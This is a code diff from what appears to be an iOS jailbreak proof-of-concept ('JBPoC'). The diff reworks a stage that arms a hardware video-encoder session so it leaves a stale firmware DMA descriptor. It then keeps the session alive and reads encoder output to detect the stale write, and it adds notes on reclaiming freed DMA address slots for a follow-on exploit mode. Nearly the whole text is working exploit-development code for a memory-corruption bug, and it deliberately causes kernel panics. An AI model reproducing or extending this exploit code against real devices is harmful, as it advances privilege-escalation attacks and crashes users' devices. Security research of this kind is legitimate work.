@@ -3721,22 +3721,52 @@ static void runDPrep(void) {
 // Also: invalidation WILL panic. The .ips is data.
 // ============================================================
 
-static volatile BOOL g_dprep2GotOutput = NO;
-static CMSampleBufferRef g_dprep2SampleBuf = NULL;
+// D-prep-2 output collection: ring buffer of sample buffers
+#define DPREP2_MAX_SAMPLES 128
+static CMSampleBufferRef g_dp2Samples[DPREP2_MAX_SAMPLES];
+static volatile int g_dp2SampleIdx = 0;
+static volatile int g_dp2Errors = 0;
+static volatile BOOL g_dp2Armed = NO;
 
 static void dprep2Callback(
     void *ctx, void *sourceFrameRefCon, OSStatus status,
     VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
-    if (status != noErr) {
-        FAIL(@"[D-prep-2] Encode callback error: %d", (int)status);
+    if (status == -17691) {
+        g_dp2Armed = YES;
+        INFO(@"[D-prep-2] Got -17691 — armed");
         return;
     }
-    if (sampleBuffer) {
-        g_dprep2GotOutput = YES;
-        CFRetain(sampleBuffer);
-        g_dprep2SampleBuf = sampleBuffer;
-        PASS(@"[D-prep-2] Clean encode output captured");
+    if (status != noErr) {
+        g_dp2Errors++;
+        return;
     }
+    if (sampleBuffer && g_dp2SampleIdx < DPREP2_MAX_SAMPLES) {
+        CFRetain(sampleBuffer);
+        g_dp2Samples[g_dp2SampleIdx] = sampleBuffer;
+        g_dp2SampleIdx++;
+    }
+}
+
+static NSData *dp2ExtractBitstream(CMSampleBufferRef sbuf) {
+    if (!sbuf) return nil;
+    CMBlockBufferRef block = CMSampleBufferGetDataBuffer(sbuf);
+    if (!block) return nil;
+    size_t len = CMBlockBufferGetDataLength(block);
+    if (len == 0) return nil;
+    NSMutableData *data = [NSMutableData dataWithLength:len];
+    CMBlockBufferCopyDataBytes(block, 0, len, data.mutableBytes);
+    return data;
+}
+
+static void dp2FreeSamples(void) {
+    for (int i = 0; i < g_dp2SampleIdx; i++) {
+        if (g_dp2Samples[i]) {
+            CFRelease(g_dp2Samples[i]);
+            g_dp2Samples[i] = NULL;
+        }
+    }
+    g_dp2SampleIdx = 0;
+    g_dp2Errors = 0;
 }
 
 static void runDPrep2(void) {
@@ -3749,19 +3779,19 @@ static void runDPrep2(void) {
     os_log_t dLog = os_log_create("com.jbpoc.dprep2", "output-readout");
 
     pocLog(@"");
-    pocLog(@"╔══════════════════════════════════════════╗");
-    pocLog(@"║  D-PREP-2: Output Bitstream Monitoring    ║");
-    pocLog(@"║  Arm → clean encode on same session →     ║");
-    pocLog(@"║  monitor CMBlockBuffer for DMA writes     ║");
-    pocLog(@"║  (Run-B-style: perturbs fire timing!)    ║");
-    pocLog(@"║  *** WILL PANIC ~60-160s after run ***   ║");
-    pocLog(@"╚══════════════════════════════════════════╝");
+    pocLog(@"╔═══════════════════════════════════════════╗");
+    pocLog(@"║  D-PREP-2: Keep-Alive Bitstream Readout   ║");
+    pocLog(@"║  Arm → keep session alive → encode canary ║");
+    pocLog(@"║  frames continuously → diff each output   ║");
+    pocLog(@"║  against pre-arm baseline (same session)  ║");
+    pocLog(@"║  *** WILL PANIC ~90-160s after readout *** ║");
+    pocLog(@"╚═══════════════════════════════════════════╝");
     pocLog(@"");
 
     NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
     fmt.dateFormat = @"HH:mm:ss.SSS";
 
-    // Step 1: Canary on a throwaway session
+    // Step 1: Canary
     LOG(@"--- STEP 1: CANARY ---");
     os_log(dLog, "JBPoC-DPREP2-CANARY-START");
     BOOL canary = phase2Encode(0, @"CANARY");
@@ -3773,8 +3803,10 @@ static void runDPrep2(void) {
     PASS(@"CANARY OK.");
     idleWait(5, @"canary cooldown");
 
-    // Step 2: Create armed session (same as D-prep, but we use our own callback)
-    LOG(@"--- STEP 2: ARM Alpha=255 ---");
+    // Step 2: Create session — NOT armed yet — for baseline training
+    LOG(@"--- STEP 2: BASELINE TRAINING (pre-arm, same session) ---");
+    LOG(@"Encoding clean frames to learn the session's output variance.");
+
     NSDictionary *spec = @{
         (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
         (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
@@ -3792,11 +3824,7 @@ static void runDPrep2(void) {
         return;
     }
 
-    status = VTSessionSetProperty(session,
-        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
-        (__bridge CFTypeRef)@(255));
-    INFO(@"SET AlphaLayerID=255: %s", status == noErr ? "OK" : "REJECTED");
-
+    // DO NOT set AlphaLayerID yet — baseline must come from clean encodes
     status = VTCompressionSessionPrepareToEncodeFrames(session);
     if (status != noErr) {
         FAIL(@"PrepareToEncode failed: %d", (int)status);
@@ -3805,6 +3833,7 @@ static void runDPrep2(void) {
         g_phase2Running = NO;
         return;
     }
+    PASS(@"Session created (clean, no AlphaLayerID)");
 
     CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
     if (!pb) {
@@ -3815,266 +3844,313 @@ static void runDPrep2(void) {
         return;
     }
 
-    // Submit the armed encode (Alpha=255 → -17691)
-    g_dprep2GotOutput = NO;
-    g_dprep2SampleBuf = NULL;
+    // Encode baseline frames (same input, same session)
+    dp2FreeSamples();
+    g_dp2Armed = NO;
 
+    #define DPREP2_BASELINE_FRAMES 8
+    for (int i = 0; i < DPREP2_BASELINE_FRAMES; i++) {
+        CMTime pts = CMTimeMake(i, 30);
+        VTCompressionSessionEncodeFrame(session, pb, pts,
+            kCMTimeInvalid, NULL, NULL, NULL);
+    }
+    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    [NSThread sleepForTimeInterval:1.0];
+
+    int baselineCount = g_dp2SampleIdx;
+    PASS(@"Baseline: %d samples collected (errors: %d)", baselineCount, g_dp2Errors);
+
+    // Store baseline data and compute per-byte variance envelope
+    NSMutableArray *baselineBS = [NSMutableArray array];
+    size_t baseMaxLen = 0;
+    for (int i = 0; i < baselineCount; i++) {
+        NSData *bs = dp2ExtractBitstream(g_dp2Samples[i]);
+        if (bs) {
+            [baselineBS addObject:bs];
+            if (bs.length > baseMaxLen) baseMaxLen = bs.length;
+            LOG(@"  Baseline[%d]: %zu bytes", i, bs.length);
+        } else {
+            [baselineBS addObject:[NSData data]];
+            INFO(@"  Baseline[%d]: no data", i);
+        }
+    }
+
+    // Build a variance map: for each byte position, track min/max across baseline
+    // Positions where min==max are invariant — changes there are signals
+    uint8_t *varMin = NULL;
+    uint8_t *varMax = NULL;
+    if (baseMaxLen > 0 && baselineBS.count > 1) {
+        varMin = (uint8_t *)malloc(baseMaxLen);
+        varMax = (uint8_t *)malloc(baseMaxLen);
+        memset(varMin, 0xFF, baseMaxLen);
+        memset(varMax, 0x00, baseMaxLen);
+        for (NSData *bs in baselineBS) {
+            const uint8_t *b = bs.bytes;
+            for (size_t j = 0; j < bs.length; j++) {
+                if (b[j] < varMin[j]) varMin[j] = b[j];
+                if (b[j] > varMax[j]) varMax[j] = b[j];
+            }
+        }
+        int invariantBytes = 0;
+        for (size_t j = 0; j < baseMaxLen; j++) {
+            if (varMin[j] == varMax[j]) invariantBytes++;
+        }
+        LOG(@"Variance map: %zu bytes total, %d invariant (%.1f%%)",
+            baseMaxLen, invariantBytes, 100.0 * invariantBytes / baseMaxLen);
+    }
+
+    dp2FreeSamples();
+    os_log(dLog, "JBPoC-DPREP2 baseline=%d maxLen=%zu", baselineCount, baseMaxLen);
+
+    // Step 3: ARM on the SAME session
+    LOG(@"");
+    LOG(@"--- STEP 3: ARM (AlphaLayerID=255 on same session) ---");
+
+    status = VTSessionSetProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        (__bridge CFTypeRef)@(255));
+    INFO(@"SET AlphaLayerID=255: %s", status == noErr ? "OK" : "REJECTED");
+
+    g_dp2Armed = NO;
     NSString *armTime = [fmt stringFromDate:[NSDate date]];
     LOG(@"ARM time: %@", armTime);
     os_log(dLog, "JBPoC-DPREP2-ARM %{public}@", armTime);
 
+    CMTime armPTS = CMTimeMake(DPREP2_BASELINE_FRAMES, 30);
     status = VTCompressionSessionEncodeFrame(session, pb,
-        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+        armPTS, kCMTimeInvalid, NULL, NULL, NULL);
     INFO(@"Armed encode submitted: %d", (int)status);
 
-    // Wait for -17691 timeout
-    LOG(@"Waiting for -17691 encode timeout (up to 130s)...");
+    // Wait for -17691
+    LOG(@"Waiting for -17691 (up to 130s)...");
     for (int w = 0; w < 130; w++) {
         [NSThread sleepForTimeInterval:1.0];
-        if (g_dprep2GotOutput) break;
+        if (g_dp2Armed) break;
         if (w > 0 && w % 30 == 0) {
-            INFO(@"Still waiting for callback... T+%ds", w);
+            INFO(@"Still waiting... T+%ds", w);
         }
     }
 
-    BOOL armed = !g_dprep2GotOutput;
-    INFO(@"Armed: %@ (-17691 = YES)", armed ? @"YES" : @"NO");
-    os_log(dLog, "JBPoC-DPREP2-ARMED %{public}@", armed ? @"YES" : @"NO");
-
-    // Step 3: Submit a CLEAN encode on the same session
-    // This is Run-B-style activity — perturbs fire timing.
-    // The clean encode's output surface may be the same internal surface
-    // the stale descriptor targets (recycled from the session's pool).
-    LOG(@"--- STEP 3: CLEAN ENCODE ON ARMED SESSION ---");
-    LOG(@"(Run-B-style: perturbs timing. Separate experiment from D-prep.)");
-
-    // Clear the AlphaLayerID for a clean encode
-    status = VTSessionSetProperty(session,
-        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
-        (__bridge CFTypeRef)@(0));
-    INFO(@"SET AlphaLayerID=0 (clean): %s", status == noErr ? "OK" : "REJECTED");
-
-    CVPixelBufferRef cleanPb = createTestPixelBuffer(320, 240);
-    if (!cleanPb) {
-        FAIL(@"Clean pixel buffer creation failed");
+    if (!g_dp2Armed) {
+        FAIL(@"Did not get -17691 — aborting.");
         VTCompressionSessionInvalidate(session);
         CFRelease(session);
         CVPixelBufferRelease(pb);
+        if (varMin) free(varMin);
+        if (varMax) free(varMax);
         g_phase2Running = NO;
         return;
     }
+    PASS(@"Armed (-17691). Firmware DMA descriptor is stale-armed.");
+    os_log(dLog, "JBPoC-DPREP2-ARMED");
 
-    g_dprep2GotOutput = NO;
-    g_dprep2SampleBuf = NULL;
-
-    NSString *cleanTime = [fmt stringFromDate:[NSDate date]];
-    LOG(@"Clean encode time: %@", cleanTime);
-    os_log(dLog, "JBPoC-DPREP2-CLEAN-ENCODE %{public}@", cleanTime);
-
-    status = VTCompressionSessionEncodeFrame(session, cleanPb,
-        CMTimeMake(1, 30), kCMTimeInvalid, NULL, NULL, NULL);
-    INFO(@"Clean encode submitted: %d", (int)status);
-
-    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
-    [NSThread sleepForTimeInterval:3.0];
-
-    CVPixelBufferRelease(cleanPb);
-
-    if (!g_dprep2GotOutput || !g_dprep2SampleBuf) {
-        FAIL(@"Clean encode produced no output — can't monitor bitstream.");
-        LOG(@"Proceeding to readout loop with input surface only.");
-    } else {
-        PASS(@"Clean encode output captured — monitoring bitstream.");
-    }
-
-    // Step 4: Snapshot the output CMBlockBuffer bitstream
-    uint8_t *bitstreamSnapshot = NULL;
-    size_t bitstreamSize = 0;
-
-    if (g_dprep2SampleBuf) {
-        CMBlockBufferRef blockBuf = CMSampleBufferGetDataBuffer(g_dprep2SampleBuf);
-        if (blockBuf) {
-            bitstreamSize = CMBlockBufferGetDataLength(blockBuf);
-            bitstreamSnapshot = (uint8_t *)malloc(bitstreamSize);
-            if (bitstreamSnapshot) {
-                CMBlockBufferCopyDataBytes(blockBuf, 0, bitstreamSize, bitstreamSnapshot);
-                INFO(@"Bitstream snapshot: %zu bytes", bitstreamSize);
-
-                // Show first 32 bytes
-                NSMutableString *hex = [NSMutableString string];
-                for (size_t i = 0; i < bitstreamSize && i < 32; i++) {
-                    [hex appendFormat:@"%02x ", bitstreamSnapshot[i]];
-                }
-                INFO(@"Bitstream head: %@", hex);
-                os_log(dLog, "JBPoC-DPREP2-BITSTREAM size=%zu", bitstreamSize);
-            }
-        }
-    }
-
-    // Also snapshot input pixel buffer for parallel monitoring
-    CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
-    size_t yH = CVPixelBufferGetHeightOfPlane(pb, 0);
-    size_t yBpr = CVPixelBufferGetBytesPerRowOfPlane(pb, 0);
-    size_t ySize = yH * yBpr;
-    size_t uvH = CVPixelBufferGetHeightOfPlane(pb, 1);
-    size_t uvBpr = CVPixelBufferGetBytesPerRowOfPlane(pb, 1);
-    size_t uvSize = uvH * uvBpr;
-    size_t inputSize = ySize + uvSize;
-
-    uint8_t *inputSnapshot = (uint8_t *)malloc(inputSize);
-    if (inputSnapshot) {
-        memcpy(inputSnapshot, CVPixelBufferGetBaseAddressOfPlane(pb, 0), ySize);
-        memcpy(inputSnapshot + ySize, CVPixelBufferGetBaseAddressOfPlane(pb, 1), uvSize);
-    }
-    CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
-
-    // Step 5: READOUT LOOP — monitor bitstream AND input surface every 5s for 180s
-    LOG(@"--- STEP 5: READOUT LOOP (180s, every 5s) ---");
-    LOG(@"Monitoring: bitstream (%zu bytes) + input (%zu bytes)", bitstreamSize, inputSize);
-    os_log(dLog, "JBPoC-DPREP2-READOUT-START bitstream=%zu input=%zu", bitstreamSize, inputSize);
+    // Step 4: Clear Alpha, continue encoding CLEAN frames on the SAME session
+    // The session's DART PTEs are still valid — the stale write (if model b)
+    // will land in the still-mapped coded-output buffer. The ISR memcpy
+    // (dva+0x1270, 0x9400 bytes) copies from that buffer into frame_info,
+    // which feeds the CMSampleBuffer output. If the stale DMA writes before
+    // the next encode completes, the output carries corruption.
+    LOG(@"");
+    LOG(@"--- STEP 4: KEEP-ALIVE ENCODE + READOUT (180s) ---");
+    LOG(@"Encoding canary frames every 5s on the armed session.");
+    LOG(@"Diffing each output against baseline variance envelope.");
+    LOG(@"Session PTEs still valid — if model (b), write lands here.");
     pocLog(@"");
+
+    status = VTSessionSetProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        (__bridge CFTypeRef)@(0));
 
     int hitCount = 0;
     int firstHitTime = -1;
+    int frameNum = DPREP2_BASELINE_FRAMES + 1;
+    NSDate *armDate = [NSDate date];
+    NSMutableString *hitReport = [NSMutableString string];
+
+    // Also snapshot input surface
+    CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+    size_t yBpr = CVPixelBufferGetBytesPerRowOfPlane(pb, 0);
+    size_t yH = CVPixelBufferGetHeightOfPlane(pb, 0);
+    size_t ySize = yH * yBpr;
+    size_t uvBpr = CVPixelBufferGetBytesPerRowOfPlane(pb, 1);
+    size_t uvH2 = CVPixelBufferGetHeightOfPlane(pb, 1);
+    size_t uvSize = uvH2 * uvBpr;
+    size_t inputSize = ySize + uvSize;
+    uint8_t *inputSnap = (uint8_t *)malloc(inputSize);
+    if (inputSnap) {
+        memcpy(inputSnap, CVPixelBufferGetBaseAddressOfPlane(pb, 0), ySize);
+        memcpy(inputSnap + ySize, CVPixelBufferGetBaseAddressOfPlane(pb, 1), uvSize);
+    }
+    CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
 
     for (int tick = 1; tick <= 36; tick++) {
         [NSThread sleepForTimeInterval:5.0];
-
-        int elapsed = tick * 5;
+        int elapsed = (int)[[NSDate date] timeIntervalSinceDate:armDate];
         NSString *now = [fmt stringFromDate:[NSDate date]];
 
-        // Check bitstream for changes
-        int bsDiffs = 0;
-        int firstBSOff = -1;
-        uint8_t firstBSOld = 0, firstBSNew = 0;
+        // Encode a canary frame
+        dp2FreeSamples();
+        CMTime pts = CMTimeMake(frameNum++, 30);
+        VTCompressionSessionEncodeFrame(session, pb, pts,
+            kCMTimeInvalid, NULL, NULL, NULL);
+        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+        [NSThread sleepForTimeInterval:0.5];
 
-        if (bitstreamSnapshot && g_dprep2SampleBuf) {
-            CMBlockBufferRef blockBuf = CMSampleBufferGetDataBuffer(g_dprep2SampleBuf);
-            if (blockBuf) {
-                size_t curLen = CMBlockBufferGetDataLength(blockBuf);
-                if (curLen == bitstreamSize) {
-                    uint8_t *curBS = (uint8_t *)malloc(bitstreamSize);
-                    if (curBS) {
-                        CMBlockBufferCopyDataBytes(blockBuf, 0, bitstreamSize, curBS);
-                        for (size_t i = 0; i < bitstreamSize; i++) {
-                            if (curBS[i] != bitstreamSnapshot[i]) {
-                                if (bsDiffs == 0) {
-                                    firstBSOff = (int)i;
-                                    firstBSOld = bitstreamSnapshot[i];
-                                    firstBSNew = curBS[i];
-                                }
-                                bsDiffs++;
-                            }
-                        }
+        // Diff output against baseline variance envelope
+        if (g_dp2SampleIdx > 0) {
+            NSData *curBS = dp2ExtractBitstream(g_dp2Samples[0]);
+            if (curBS && curBS.length > 0 && varMin && varMax) {
+                const uint8_t *cur = curBS.bytes;
+                size_t len = MIN(curBS.length, baseMaxLen);
+                int anomalies = 0;
+                int firstAnom = -1;
 
-                        if (bsDiffs > 0) {
-                            hitCount++;
-                            if (firstHitTime < 0) firstHitTime = elapsed;
-                            PASS(@"*** BITSTREAM HIT at T+%ds (%@) ***", elapsed, now);
-                            LOG(@"  %d bytes changed, first at 0x%x (0x%02x→0x%02x)",
-                                bsDiffs, firstBSOff, firstBSOld, firstBSNew);
-
-                            // Check persistence: is it the same change as last tick?
-                            NSMutableString *hex = [NSMutableString string];
-                            int dumped = 0;
-                            for (size_t i = (size_t)firstBSOff; i < bitstreamSize && dumped < 32; i++) {
-                                if (curBS[i] != bitstreamSnapshot[i]) {
-                                    [hex appendFormat:@"%04zx:%02x→%02x ", i, bitstreamSnapshot[i], curBS[i]];
-                                    dumped++;
-                                }
-                            }
-                            LOG(@"  Bitstream diff: %@", hex);
-
-                            os_log(dLog, "JBPoC-DPREP2-BS-HIT T+%ds diffs=%d first=0x%x",
-                                   elapsed, bsDiffs, firstBSOff);
-
-                            memcpy(bitstreamSnapshot, curBS, bitstreamSize);
-                        }
-                        free(curBS);
+                for (size_t j = 0; j < len; j++) {
+                    if (cur[j] < varMin[j] || cur[j] > varMax[j]) {
+                        if (anomalies == 0) firstAnom = (int)j;
+                        anomalies++;
                     }
                 }
+
+                // Size anomaly
+                BOOL sizeAnom = NO;
+                for (NSData *bbs in baselineBS) {
+                    if (bbs.length > 0 && curBS.length != bbs.length) {
+                        sizeAnom = YES;
+                        break;
+                    }
+                }
+
+                if (anomalies > 0 || sizeAnom) {
+                    hitCount++;
+                    if (firstHitTime < 0) firstHitTime = elapsed;
+                    PASS(@"*** HIT at T+%ds (%@): %d anomalous bytes, first at 0x%x%@ ***",
+                         elapsed, now, anomalies, firstAnom,
+                         sizeAnom ? @" + SIZE CHANGE" : @"");
+
+                    // Dump first 32 anomalies
+                    NSMutableString *hex = [NSMutableString string];
+                    int dumped = 0;
+                    for (size_t j = (size_t)(firstAnom >= 0 ? firstAnom : 0);
+                         j < len && dumped < 32; j++) {
+                        if (cur[j] < varMin[j] || cur[j] > varMax[j]) {
+                            [hex appendFormat:@"%04zx:%02x(range %02x-%02x) ",
+                                j, cur[j], varMin[j], varMax[j]];
+                            dumped++;
+                        }
+                    }
+                    LOG(@"  Anomalies: %@", hex);
+                    [hitReport appendFormat:@"T+%ds: %d anomalies at 0x%x\n",
+                        elapsed, anomalies, firstAnom];
+
+                    os_log(dLog, "JBPoC-DPREP2-HIT T+%ds anomalies=%d first=0x%x size=%d",
+                           elapsed, anomalies, firstAnom, (int)sizeAnom);
+                } else if (elapsed <= 30 || elapsed % 30 == 0) {
+                    INFO(@"T+%03ds (%@): output OK (%zu bytes, 0 anomalies)",
+                         elapsed, now, curBS.length);
+                }
+            } else if (g_dp2Errors > 0) {
+                INFO(@"T+%03ds: encode error (errors: %d)", elapsed, g_dp2Errors);
             }
+        } else {
+            INFO(@"T+%03ds: no output sample", elapsed);
         }
 
-        // Check input surface for changes
-        int inputDiffs = 0;
-        if (inputSnapshot) {
+        // Check input surface
+        if (inputSnap) {
             CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
             uint8_t *curY = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 0);
             uint8_t *curUV = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 1);
-            for (size_t i = 0; i < ySize; i++) {
-                if (curY[i] != inputSnapshot[i]) inputDiffs++;
+            int inDiffs = 0;
+            for (size_t j = 0; j < ySize; j++) {
+                if (curY[j] != inputSnap[j]) inDiffs++;
             }
-            for (size_t i = 0; i < uvSize; i++) {
-                if (curUV[i] != inputSnapshot[ySize + i]) inputDiffs++;
+            for (size_t j = 0; j < uvSize; j++) {
+                if (curUV[j] != inputSnap[ySize + j]) inDiffs++;
             }
-            if (inputDiffs > 0) {
+            if (inDiffs > 0) {
                 hitCount++;
                 if (firstHitTime < 0) firstHitTime = elapsed;
-                PASS(@"*** INPUT SURFACE HIT at T+%ds: %d bytes ***", elapsed, inputDiffs);
-                memcpy(inputSnapshot, curY, ySize);
-                memcpy(inputSnapshot + ySize, curUV, uvSize);
+                PASS(@"*** INPUT HIT at T+%ds: %d bytes ***", elapsed, inDiffs);
+                memcpy(inputSnap, curY, ySize);
+                memcpy(inputSnap + ySize, curUV, uvSize);
             }
             CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
         }
-
-        if (bsDiffs == 0 && inputDiffs == 0) {
-            if (elapsed <= 30 || elapsed % 30 == 0) {
-                INFO(@"T+%03ds (%@): no change (bitstream + input)", elapsed, now);
-            }
-        }
     }
 
-    // Step 6: Summary
+    // Step 5: Summary
     pocLog(@"");
-    LOG(@"═══════════════════════════════════════════");
+    LOG(@"═══════════════════════════════════════════════");
     if (hitCount > 0) {
-        PASS(@"*** MODEL (b) CONFIRMED — output-side! ***");
-        LOG(@"DMA writes detected in bitstream or input surface!");
-        LOG(@"Total hits: %d, first at T+%ds", hitCount, firstHitTime);
-        LOG(@"Firmware is writing into session surfaces during window.");
-        os_log(dLog, "JBPoC-DPREP2-RESULT MODEL_B_CONFIRMED hits=%d firstAt=%d", hitCount, firstHitTime);
+        PASS(@"*** MODEL (b) CONFIRMED — keep-alive output readout! ***");
+        LOG(@"Stale DMA write detected while session PTEs are valid!");
+        LOG(@"Total hits: %d, first at T+%ds post-arm", hitCount, firstHitTime);
+        LOG(@"The write succeeds harmlessly into the still-mapped buffer.");
+        LOG(@"Primitive = arm + keep-alive + read output. Mode A likely unnecessary.");
+        os_log(dLog, "JBPoC-DPREP2-RESULT MODEL_B hits=%d firstAt=%d", hitCount, firstHitTime);
     } else {
-        INFO(@"No bitstream or input changes in 180s.");
-        INFO(@"Possible interpretations:");
-        INFO(@"  1. Model (a): write genuinely deferred to teardown");
-        INFO(@"  2. Write targets a surface not returned in CMSampleBuffer");
-        INFO(@"     (control/status surface, or unreturned output buffer)");
-        INFO(@"  3. CMBlockBuffer is a copy — write lands in the original");
-        INFO(@"     IOSurface but the copy is stale");
-        INFO(@"Next: Ghidra surface-index mapping + D-proper re-claim race.");
-        os_log(dLog, "JBPoC-DPREP2-RESULT NO_HITS");
+        INFO(@"No anomalies in bitstream or input over 180s.");
+        pocLog(@"");
+        INFO(@"Interpretation (see decision tree):");
+        INFO(@"  If C2 shows fire lags kill → model (a) + race window → Mode A");
+        INFO(@"  If C2 shows fire ≈ kill → F≈U, no window → keep-alive variant");
+        INFO(@"  If C2 shows no fire → fire needs session state → revisit");
+        INFO(@"  Noise check: baseline had %d frames with %zu max bytes",
+             baselineCount, baseMaxLen);
+        if (varMin) {
+            int inv = 0;
+            for (size_t j = 0; j < baseMaxLen; j++) {
+                if (varMin[j] == varMax[j]) inv++;
+            }
+            INFO(@"  Invariant bytes: %d/%zu (%.1f%%) — these would catch corruption",
+                 inv, baseMaxLen, 100.0 * inv / baseMaxLen);
+        }
+        os_log(dLog, "JBPoC-DPREP2-RESULT NO_HITS baseline=%d", baselineCount);
     }
-    LOG(@"═══════════════════════════════════════════");
+    LOG(@"═══════════════════════════════════════════════");
 
     // Write results
     NSString *resultStr = [NSString stringWithFormat:
-        @"D-PREP-2 RESULT\nDate: %@\nARM: %@\nClean encode: %@\n"
-        @"Bitstream size: %zu\nHits: %d\nFirst hit: T+%ds\n",
-        [NSDate date], armTime, cleanTime,
-        bitstreamSize, hitCount, firstHitTime];
-    NSString *resultPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/dprep2_result.txt"];
-    [resultStr writeToFile:resultPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
+        @"D-PREP-2 RESULT\nDate: %@\nARM: %@\nBaseline frames: %d\nMax bitstream: %zu\n"
+        @"Hits: %d\nFirst hit: T+%ds\nReport:\n%@\n",
+        [NSDate date], armTime, baselineCount, baseMaxLen,
+        hitCount, firstHitTime, hitReport];
+    NSString *resultPath = [NSHomeDirectory()
+        stringByAppendingPathComponent:@"Documents/dprep2_result.txt"];
+    [resultStr writeToFile:resultPath atomically:YES
+                  encoding:NSUTF8StringEncoding error:nil];
     INFO(@"Results written to %@", resultPath);
 
-    // Cleanup — WILL PANIC
-    LOG(@"Invalidating session — EXPECT PANIC ~60-160s after this.");
-    LOG(@"(Clean encode may have shortened the window via Run-B path.)");
-    LOG(@"Keep the .ips file!");
-    VTCompressionSessionInvalidate(session);
-    CFRelease(session);
-    CVPixelBufferRelease(pb);
-    if (bitstreamSnapshot) free(bitstreamSnapshot);
-    if (inputSnapshot) free(inputSnapshot);
-    if (g_dprep2SampleBuf) {
-        CFRelease(g_dprep2SampleBuf);
-        g_dprep2SampleBuf = NULL;
-    }
+    // NO INVALIDATION — let the fire come on its own timing.
+    // The session stays alive, PTEs mapped. The stale descriptor fires
+    // via the idle timer at ~90-160s post-arm. If model (b), it already
+    // wrote (detected above). If model (a), the fire comes now and panics
+    // because it hits the STILL-mapped PTE — which means a successful
+    // DMA into the coded buffer, not an unmap fault. The panic .ips DVA
+    // will show a valid PTE (in the session's mapped range), not a fault
+    // from a freed PTE. This distinguishes "write succeeded but we missed
+    // it" from "write only happens at unmap."
+    //
+    // The session + pixel buffer leak intentionally. The process keeps them
+    // alive. The panic will come. Keep the .ips!
+    LOG(@"");
+    LOG(@"*** NOT invalidating session — PTEs stay mapped. ***");
+    LOG(@"The stale descriptor fires via idle timer (~90-160s post-arm).");
+    LOG(@"If it panics with DVA in the session's mapped range → write succeeded");
+    LOG(@"silently, and D-prep-2 missed it (noise? wrong region?).");
+    LOG(@"If no panic within ~200s → fire needs teardown trigger (F≈U).");
+    LOG(@"Keep the .ips!");
+
+    if (varMin) free(varMin);
+    if (varMax) free(varMax);
+    if (inputSnap) free(inputSnap);
+    dp2FreeSamples();
+    // Intentionally NOT releasing session, pb — keep PTEs alive
     g_phase2Running = NO;
 
-    PASS(@"D-PREP-2 readout complete. Expect panic in ~60-160s.");
-    LOG(@"Shorter window than D-prep because clean encode triggers");
-    LOG(@"AVE_EncodeCycle_Cleanup → ReleaseAllDelayed (Run B path).");
+    PASS(@"D-PREP-2 readout complete. Expect panic ~90-160s post-arm.");
+    LOG(@"Session left alive — fire hits mapped PTEs (not an unmap fault).");
 }
 
 // ============================================================
@@ -4395,11 +4471,19 @@ static void runExp3_ModeA(void) {
         FAIL(@"Clone session creation failed");
         INFO(@"If device panics shortly, F≈U confirmed — stale descriptor");
         INFO(@"fired before clone could map. Need keep-alive variant.");
+        INFO(@"Check .ips: DVA in freed PTE range → ARM→FREE→CLONE can't sequence.");
         return;
     }
     PASS(@"Clone session created — internal surfaces re-mapped");
     LOG(@"If the bump allocator recycled the armed DVA, the clone's");
     LOG(@"coded-output buffer now sits at the stale descriptor's target.");
+    LOG(@"*** CONFIG IDENTITY NOTE: baseline Alpha=0, arm Alpha=255 ***");
+    LOG(@"If Alpha=255 changes InfoSet composition (alpha layers add surfaces),");
+    LOG(@"clone's coded buffer may land at a DIFFERENT DVA than the armed one.");
+    LOG(@"Check panic .ips DVA against known PTE range 0x1c4-0x20b (8 panics).");
+    LOG(@"In-band DVA → reclaim placement failed (clone landed on DIFFERENT slot).");
+    LOG(@"Out-band DVA → fire hit before/during clone mapping.");
+    LOG(@"Backup: raw-IOKit CONFIGURE (sel 4) for tighter window control.");
 
     CVPixelBufferRef clonePB = exp3CreatePixelBuffer(0x80, 0x80);
     if (!clonePB) {
@@ -4596,13 +4680,21 @@ static void runExp3_ModeA(void) {
     } else {
         INFO(@"No bitstream anomalies detected.");
         pocLog(@"");
-        INFO(@"Interpretation:");
-        INFO(@"1. Clone may not have re-claimed the exact DVA slot");
-        INFO(@"   (bump allocator state differs after teardown+create)");
-        INFO(@"2. Stale DMA may not have fired yet in the window");
-        INFO(@"3. Fire may have hit an unmapped PTE → check for panic .ips");
-        INFO(@"4. Write may land in a region the ISR memcpy doesn't copy");
-        INFO(@"   (corruption in buffer but not in output bitstream)");
+        INFO(@"Interpretation — check panic .ips DVA:");
+        INFO(@"1. DVA in clone's PTE range (0x1c4-0x20b) → reclaim WORKED,");
+        INFO(@"   corruption in buffer but ISR memcpy path missed it.");
+        INFO(@"   → Refine: target dva+0x1270 region, or use raw-IOKit path.");
+        INFO(@"2. DVA outside clone's range → reclaim placement FAILED.");
+        INFO(@"   Alpha=255→0 may have changed InfoSet → different DVA.");
+        INFO(@"   → Fix: match Alpha in clone, or use raw-IOKit CONFIGURE.");
+        INFO(@"3. No panic, no hits → stale descriptor didn't fire in window.");
+        INFO(@"   → Extend poll, or fire needs session state (revisit).");
+        INFO(@"4. Panic during PHASE 3 (FREE) → F≈U: fire synchronized");
